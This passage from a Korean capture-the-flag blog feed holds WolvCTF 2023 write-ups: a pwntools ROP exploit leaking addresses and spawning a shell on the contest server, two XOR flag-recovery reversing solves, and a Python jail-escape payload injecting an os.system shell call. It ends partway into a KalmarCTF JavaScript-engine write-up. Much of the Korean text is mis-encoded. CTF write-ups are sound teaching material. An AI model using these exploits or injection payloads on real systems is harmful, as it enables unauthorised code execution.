ëœë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;echotwo.wolvctf-2023.kctf.cloud&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x4c&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">pie_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">e.address = pie_leak - <span class="number">0x124C</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># no pop rdi</span></span><br><span class="line"><span class="comment"># no libc address in stack</span></span><br><span class="line"><span class="comment"># $rdi   : 0x007ffdd808f940  â†’  0x007ff4dec620d0  â†’  &lt;funlockfile+0&gt; endbr64</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x620d0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;w3l1_m4yb3_th4t_w45_a_b4d_id3a&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> medium/hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - child-re (rev)</title>
      <link href="/230321-wolvctf2023-childre/"/>
      <url>/230321-wolvctf2023-childre/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>Youâ€™ve graduated from baby, congrats!</p></blockquote><ul><li>[141 solves &#x2F; 100 points]</li></ul><p>ë¦¬ë²„ì‹± ë¬¸ì œì—ì„œ ì†”ë¸Œê°€ ê°€ìž¥ ë§Žì•„ì„œ ë„ì „í•´ë´¤ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>mainì„ ì‚´íŽ´ë³´ë©´ í”Œëž˜ê·¸ëŠ” ì–´ë””ì—”ê°€ ìžˆë‹¤ê³  í•œë‹¤. ë¬¸ìžì—´ ê²€ìƒ‰ìœ¼ë¡œëŠ” ë³´ì´ì§€ ì•Šê³  í•¨ìˆ˜ ëª©ë¡ì„ ì‚´íŽ´ë³´ë©´ ì•„ëž˜ì™€ ê°™ì€ í•¨ìˆ˜ê°€ ë³´ì¸ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1165</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">43</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">42</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+6Ah] [rbp-6h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;]I^LQb\x1B^IBB\x1BA\x19X\x1Fum_\x1BN\x19u^\x1Au^B\x19um\x1EF\x1ERS\v\vu\x1E\x18W&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    s[i] = a1 ^ v2[i];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì›ëž˜ <code>strcpy</code>ê°€ ë³´ì´ì§€ ì•Šì•˜ëŠ”ë° ë³€ìˆ˜ë“¤ ìžë£Œí˜•ì´ë‚˜ ë°°ì—´ í¬ê¸°ë¥¼ ì¡°ì ˆí•´ì£¼ë‹ˆê¹Œ ë³´ì˜€ë‹¤. ë­”ê°€ <code>puts</code> í•¨ìˆ˜ë¥¼ í†µí•´ flagë¥¼ ì¶œë ¥í•´ì¤€ë‹¤ê³  ìƒê°í•´ì„œ ì € í•¨ìˆ˜ë§Œ ë”°ë¡œ ì‹¤í–‰ì‹œì¼œë³´ê¸°ë¡œ í–ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ì•„ëž˜ì™€ ê°™ì´ ì½”ë“œë¥¼ ìž‘ì„±í•´ì£¼ê³  ì»´íŒŒì¼ í›„ ì‹¤í–‰í•˜ë©´..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*char v2[43]; // [rsp+10h] [rbp-60h] BYREF*/</span></span><br><span class="line"><span class="type">char</span>* v2;</span><br><span class="line"><span class="type">char</span> s[<span class="number">42</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"><span class="type">char</span> v4; <span class="comment">// [rsp+6Ah] [rbp-6h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">/*memset(s, 0, sizeof(s));*/</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="string">&quot;]I^LQb\x1B^IBB\x1B\x41\x19X\x1Fum_\x1BN\x19u^\x1Au^B\x19um\x1E\x46\x1ERS\v\vu\x1E\x18W&quot;</span>;</span><br><span class="line">  <span class="type">char</span> a1 = <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    s[i] = a1 ^ v2[i];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flagê°€ ì§ ! í•˜ê³  ë‚˜ì˜¨ë‹¤.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;H1tchh1k3r5_Gu1d3_t0_th3_G4l4xy!!_42&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - Homework Help (rev)</title>
      <link href="/230321-wolvctf2023-homeworkhelp/"/>
      <url>/230321-wolvctf2023-homeworkhelp/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>I wrote a program to solve my math homework so I could find flags. Unfortunatly my program sucks at math and just makes me do it. It does find flags though</p></blockquote><ul><li>[93 solves &#x2F; 265 points]</li></ul><p>ë¦¬ë²„ì‹± ë¬¸ì œì—ì„œ ë‘! ë²ˆì§¸ë¡œ ì†”ë¸Œê°€ ë§Žì•„ì„œ ë„ì „í•´ë´¤ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë¶„ì„í•˜ë‹¤ë³´ë©´ ì¡°ê¸ˆ ì–´ì´ì—†ëŠ”ë°(?) ê²°êµ­ ë¶„ì„í•´ì•¼í•  í•¨ìˆ˜ëŠ” í•˜ë‚˜ë‹¤. <code>_stack_chk_fail</code> í•¨ìˆ˜ì´ë‹¤. í•¨ìˆ˜ëª…ì´ í—·ê°ˆë ¤ì„œ IDAë„ ë¶„ì„ì„ ì œëŒ€ë¡œ ëª»í•´ì„œ ë¶„ì„í•´ì•¼í•  í•¨ìˆ˜ë¥¼ ì§ê´€ì ìœ¼ë¡œ ì°¾ì§€ ëª»í–ˆë‹¤. ì´ëŸ° ê²½ìš°ëŠ” ì–´ì…ˆë¸”ë¦¬ë¥¼ ì§ì ‘ í™•ì¸í•´ì•¼ ì •í™•í•˜ê²Œ ë¶„ì„í•  ìˆ˜ ìžˆë‹¤.</p><p>ì•„ë¬´ë“  ë¶„ì„í•´ì•¼í•  ë¡œì§ì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">idx = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0x41</span>; ; i = v3[idx + <span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  v3[<span class="number">0</span>] ^= i;</span><br><span class="line">  <span class="keyword">if</span> ( FLAG[idx] != v3[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ++idx == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well Done.&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>break</code> ë˜ì§€ ì•Šìœ¼ë©´ flagë¥¼ ì¶œë ¥í•´ì¤€ë‹¤. ì´ë¥¼ pythonìœ¼ë¡œ ë‹¤ì‹œ ìž¬êµ¬í˜„í–ˆë‹¤. ì´ë•Œ <code>v3</code> ë³€ìˆ˜ê°€ í—·ê°ˆë¦¬ê²Œ ì•„ëž˜ì²˜ëŸ¼ ì •ì˜ë˜ì–´ ìžˆì–´ì„œ ì£¼ì˜í•˜ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v3[<span class="number">2</span>] = <span class="number">0x14</span>;</span><br><span class="line">*&amp;v3[<span class="number">3</span>] = <span class="number">0x1200000017</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">5</span>] = <span class="number">0x500000001D</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">7</span>] = <span class="number">0x5D00000046</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">9</span>] = <span class="number">0x4100000042</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">11</span>] = <span class="number">0x330000006C</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">13</span>] = <span class="number">0x5A0000005D</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">15</span>] = <span class="number">0x3A0000000E</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">17</span>] = <span class="number">0x410000006A</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">19</span>] = <span class="number">0x5700000040</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">21</span>] = <span class="number">0x3400000008</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">23</span>] = <span class="number">0xB0000003C</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">25</span>] = <span class="number">0x3400000003</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">27</span>] = <span class="number">0x4600000028</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">29</span>] = <span class="number">0x530000005F</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">31</span>] = <span class="number">0x5000000010</span>LL;</span><br><span class="line">v3[<span class="number">0</span>] = <span class="number">0x36</span>;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">arr = [</span><br><span class="line">    <span class="number">0x1400000036</span>,</span><br><span class="line">    <span class="number">0x1200000017</span>,</span><br><span class="line">    <span class="number">0x500000001D</span>,</span><br><span class="line">    <span class="number">0x5D00000046</span>,</span><br><span class="line">    <span class="number">0x4100000042</span>,</span><br><span class="line">    <span class="number">0x330000006C</span>,</span><br><span class="line">    <span class="number">0x5A0000005D</span>,</span><br><span class="line">    <span class="number">0x3A0000000E</span>,</span><br><span class="line">    <span class="number">0x410000006A</span>,</span><br><span class="line">    <span class="number">0x5700000040</span>,</span><br><span class="line">    <span class="number">0x3400000008</span>,</span><br><span class="line">    <span class="number">0x0B0000003C</span>,</span><br><span class="line">    <span class="number">0x3400000003</span>,</span><br><span class="line">    <span class="number">0x4600000028</span>,</span><br><span class="line">    <span class="number">0x530000005F</span>,</span><br><span class="line">    <span class="number">0x5000000010</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">arr2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    arr2.append(i &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    arr2.append(i &gt;&gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">current = arr2[<span class="number">0</span>] ^ <span class="number">0x41</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(current), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(arr2)):</span><br><span class="line">    current = current ^ arr2[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(current), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ì²« ë²ˆì§¸ ë°˜ë³µë¬¸ì¼ ê²½ìš°ë§Œ <code>0x41</code>ì„ xor í–ˆìœ¼ë‹ˆ ê·¸ ê²½ìš°ë§Œ ë¨¼ì € ì²˜ë¦¬í•´ì£¼ê³  ê·¸ ë‹¤ìŒë¶€í„°ëŠ” 1ë¶€í„° 1ì”© ì˜¬ë ¤ê°€ë©´ì„œ xorë¥¼ ì²˜ë¦¬í•´ì£¼ë©´ ëœë‹¤.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;+m0r3_l1ke_5t4ck_chk_w1n=-&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> easy/medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - escaped (jail escape)</title>
      <link href="/230320-wolvctf2023-escaped/"/>
      <url>/230320-wolvctf2023-escaped/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>nya<br><code>nc escaped.wolvctf.io 1337</code></p></blockquote><ul><li>[54 solves &#x2F; 50 points]</li></ul><p>jail escapeë¼ê³ ë„ í•˜ê³  jail breakë¼ê³ ë„ í•˜ëŠ” ë“¯</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë¬¸ì œì—ì„œ ì£¼ì–´ì§„ python ì½”ë“œë¥¼ ì‚´íŽ´ë³´ìž.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my `cat` program. Give me a string and I&#x27;ll output it back.&quot;</span>)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter your string (with double quotes) &gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> code[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> code[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> <span class="built_in">all</span>(ch != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">for</span> ch <span class="keyword">in</span> code[<span class="number">1</span>:-<span class="number">1</span>]):</span><br><span class="line">  compiled = <span class="built_in">compile</span>(<span class="string">&#x27;print(&quot;&#x27;</span> + <span class="built_in">eval</span>(code) + <span class="string">&#x27;&quot;)&#x27;</span>, <span class="string">&quot;out&quot;</span>, mode = <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure><p>â€œâ€ìœ¼ë¡œ ê°ì‹¸ì„œ ìž…ë ¥ì„ ë³´ë‚´ë©´ print í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì¶œë ¥í•´ì¤€ë‹¤. ì´ë•Œ ì£¼ì˜í•´ì•¼í•  ì ì€ â€œì™€ â€œ ì‚¬ì´ì— â€œê°€ ë˜ ë“¤ì–´ê°€ë©´ ì•ˆëœë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ì•½ê°„ ì»¤ë§¨ë“œ ì¸ì ì…˜ í•˜ëŠ” ëŠë‚Œìœ¼ë¡œ ë‹¤ê°€ê°€ë³´ìž.<br><code>&quot;</code>ì˜ ì•„ìŠ¤í‚¤ ì½”ë“œì¸ <code>\x22</code>ì„ ì´ìš©í•˜ì—¬ <code>print(&quot;&quot;)</code>ì„ ë§Œë“¤ì–´ì£¼ê³  <code>;</code>ì„ ì´ìš©í•´ì„œ ëª…ë ¹ì–´ë¥¼ í•˜ë‚˜ ë” ì‹¤í–‰ì‹œí‚¤ë©´ ëœë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;a&quot;);print(&quot;b&quot;)</span><br><span class="line">a</span><br><span class="line">b</span><br></pre></td></tr></table></figure><p>ì¤‘ìš”í•œ ì ì€ íŽ˜ì´ë¡œë“œë¥¼ ë³´ë‚¼ ë•Œ <code>&quot;</code>ì™€ <code>&quot;</code>ìœ¼ë¡œ ê°ì‹¸ì•¼ í•œë‹¤.</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x22);__import__(&#x27;os&#x27;).system(&#x27;/bin/sh&#x27;)#&quot;</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;m30w_uwu_:3&#125;</span><br></pre></td></tr></table></figure><img src="/images/230320-wolvctf2023-escaped/Screenshot 2023-03-29 at 16.32.27.png" width=600/><br>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KalmarCTF 2023 - mjs (JS Engine, OOB)</title>
      <link href="/230318-kalmarctf2023-mjs/"/>
      <url>/230318-kalmarctf2023-mjs/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1878">https://ctftime.org/event/1878</a></li></ul><blockquote><p>Toddlerâ€™s first browser exploitation: <a href="https://github.com/cesanta/mjs">https://github.com/cesanta/mjs</a><br><code>nc 54.93.211.13 10002</code><br><code>clone</code>, <code>pwn</code>, <code>warmup</code></p></blockquote><ul><li>[52 solves &#x2F; 100 points]</li></ul><p>ì²˜ìŒìœ¼ë¡œ í¬ë„ˆë¸”ì— ë‚˜ì˜¨ ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ ë¬¸ì œë¥¼ ì™„ì£¼í–ˆë‹¤..! í’€ì´ë¥¼ ë‘ ê°€ì§€ ì†Œê°œí•œë‹¤. ì²« ë²ˆì§¸ í’€ì´ëŠ” ë‚´ê°€ í’€ì´í•œ ë°©ì‹ì´ê³  ë‘ ë²ˆì§¸ëŠ” ì¹œêµ¬ê°€ í’€ì´í•œ ë°©ì‹ì´ë‹¤. ì¹œêµ¬ í’€ì´ ë³´ë©´ì„œ ë§Žì´ ê³µë¶€í•  ìˆ˜ ìžˆì—ˆë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì´ ë¬¸ì œëŠ” descriptionì— í¬í•¨ëœ mjs ë ˆí¬ë¥¼ ì°¸ê³ í•´ì„œ ë¶„ì„ì„ í•´ì•¼í•œë‹¤. ë¬¸ì œì—ì„œëŠ” ë¸Œë¼ìš°ì € ìµìŠ¤ë¼ê³  í‘œí˜„í–ˆì§€ë§Œ ë ˆí¬ì— ë“¤ì–´ê°€ì„œ Overviewë¥¼ ì½ì–´ë³´ë©´ ë¸Œë¼ìš°ì €ì— ì‹¤ì œë¡œ ì“°ì´ëŠ” ì—”ì§„ì¸ì§€ëŠ” ìž˜ ëª¨ë¥´ê² ë‹¤..ã…Ž IoT ê¸°ê¸°ì—ì„œ ë³¼ ìˆ˜ ìžˆì„ ê²ƒ ê°™ë‹¤.</p><p>ì•„ë¬´íŠ¼ ì´ ë¬¸ì œì—ì„œ diff.patch íŒŒì¼ì„ ì œê³µí•´ì¤¬ëŠ”ë° ì‚´íŽ´ë³´ìž. </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 